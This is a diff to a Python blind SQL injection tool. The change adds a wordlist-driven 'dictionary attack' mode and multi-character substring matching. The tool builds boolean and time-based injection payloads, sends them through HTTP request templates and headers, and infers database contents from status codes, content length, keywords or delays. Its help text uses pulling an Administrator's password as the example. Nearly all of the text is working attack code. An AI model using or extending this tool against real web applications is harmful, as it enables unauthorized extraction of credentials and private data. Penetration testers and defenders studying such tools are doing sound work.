@@ -329,6 +329,7 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
 def extract_data(url, table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
 
     extracted_data = ""
+    wordlist = None
 
     if args.verbose:
         print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
@@ -336,31 +337,15 @@ def extract_data(url, table, column, where_clause, string_function, position, db
         if not args.sleep_only:
             print(f"[VERBOSE] Extraction method: {extraction}")
 
-    # Override
-
-    if args.sleep_only:
-        print("[*] Sleep-only mode enabled. Using sleep-based extraction exclusively.")
-        while position <= data_length:
-            found_char = False
-            for char in CHARSET:
-                result = sleep_extraction(
-                    url, table, column, where_clause, string_function, position, 
-                    char, request_template, injectable_headers, static_headers, 
-                    db_name, args
-                )
-                
-                if result:
-                    extracted_data += result
-                    print(f"Character found: {char} at position {position}")
-                    position += 1
-                    found_char = True
-                    break
-
-            if not found_char:
-                print(f"Data extraction complete: {extracted_data}")
-                break
-
-        return extracted_data
+    if args.dictionary_attack:
+        try:
+            with open(args.dictionary_attack, 'r') as wordlist_file:
+                wordlist = [line.strip() for line in wordlist_file.readlines()]
+            if args.verbose:
+                print(f"[VERBOSE] Loaded {len(wordlist)} words from dictionary file.")
+        except Exception as e:
+            print(f"[-] Error loading wordlist: {e}")
+            return extracted_data
 
     # Step 1: Baseline request
     try:
@@ -371,40 +356,40 @@ def extract_data(url, table, column, where_clause, string_function, position, db
         print(f"[-] Error during baseline request: {e}")
         return extracted_data
 
-    # Step 2: Iterate through possible characters until data_length is reached
+    # Step 2: Iterate through possible characters or words until data_length is reached
     while position <= data_length:
-        found_char = False
-        for char in CHARSET:
-            result = extract_character(
-                url, table, column, where_clause, string_function, position, char, 
-                request_template, injectable_headers, static_headers, 
-                extraction, baseline_status_code, baseline_content_length, args
-            )
-
-            if result:
-                extracted_data += result
-                print(f"Character found: {char} at position {position}")
-                position += 1
-                found_char = True
-                break
-
-        # Fallback
-        if not found_char:
-            print("[*] Fallback: Attempting sleep-based extraction...")
-            for char in CHARSET:
-                result = sleep_extraction(
-                    url, table, column, where_clause, string_function, position, 
-                    char, request_template, injectable_headers, static_headers, 
-                    db_name, args
+        found_match = False
+        for value in wordlist if wordlist else CHARSET:
+                result = extract_value(
+                    url, table, column, where_clause, string_function, position, value, 
+                    request_template, injectable_headers, static_headers, 
+                    extraction, baseline_status_code, baseline_content_length, args
                 )
-                
+
                 if result:
                     extracted_data += result
-                    position += 1
-                    found_char = True
+                    print(f"Value found: {value} at position {position}")
+                    position += len(result)
+                    found_match = True
                     break
 
-            if not found_char:
+        # Fallback
+        if not found_match:
+            print("[*] Fallback: Attempting sleep-based extraction...")
+            for value in wordlist if wordlist else CHARSET:
+                result = sleep_extraction(
+                    url, table, column, where_clause, string_function, position, 
+                    value, request_template, injectable_headers, static_headers, 
+                    db_name, args
+                )
+
+                if result:
+                    extracted_data += result
+                    position += len(result) if wordlist else 1
+                    found_match = True
+                    break
+
+            if not found_match:
                 print(f"Data extraction complete: {extracted_data}")
                 break
 
@@ -583,9 +568,11 @@ def sleep_detection(db_name, sleep_query, url, request_template, injectable_head
 
     return None, None
 
-def extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args):
+def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args):
 
-    payload = (f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}")
+    value_length = len(value)
+    
+    payload = f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
     encoded_payload = quote(payload)
 
     try:
@@ -608,37 +595,39 @@ def extract_character(url, table, column, where_clause, string_function, positio
 
         if extraction == "keyword":
             if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                return char
+                return value
             if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                 return None
         elif extraction == "status":
             if response.status_code != baseline_status_code:
-                return char
+                return value
         elif extraction == "content":
             response_content_length = len(response.text)
             if response_content_length != baseline_content_length:
-                return char
+                return value
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during character extraction for character {char}: {e}")
+        print(f"[-] Error during extraction for value {value}: {e}")
         return None
 
     return None
 
-def sleep_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args):
+def sleep_extraction(url, table, column, where_clause, string_function, position, input_value, request_template, injectable_headers, static_headers, db_name, args):
 
     sleep_function = version_queries[db_name].get("sleep_function", None)
-    
+
     if not sleep_function or sleep_function == "N/A":
         print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
         return None
+
+    value_length = len(input_value)
 
     for db_specific, sleep_query in sleep_function.items():
         if not sleep_query or sleep_query == "N/A":
             print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
             continue
 
-        payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}'"
+        payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{input_value}'"
         encoded_payload = quote(payload)
 
         if args.verbose:
@@ -658,16 +647,16 @@ def sleep_extraction(url, table, column, where_clause, string_function, position
                 return None
 
             if response_time > 5:
-                print(f"[+] Sleep-based character found: {char} at position {position}")
+                print(f"[+] Sleep-based match found: {input_value} at position {position}")
                 if args.delay > 0:
                     if args.verbose:
                         print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                     time.sleep(args.delay)
 
-                return char
+                return input_value
 
         except requests.exceptions.RequestException as e:
-            print(f"[-] Error during sleep-based extraction for character {char}: {e}")
+            print(f"[-] Error during sleep-based extraction for {input_value}: {e}")
 
     return None
 
@@ -686,6 +675,7 @@ def main():
     parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
     parser.add_argument('-w', '--where', required=False, help="WHERE clause (e.g., Username = 'Administrator')")
     parser.add_argument('-m', '--max-length', type=int, default=100, help="Maximum length of the extracted data that the script will check for (default: 100)")
+    parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist file for dictionary-based extraction.")
     parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
     parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
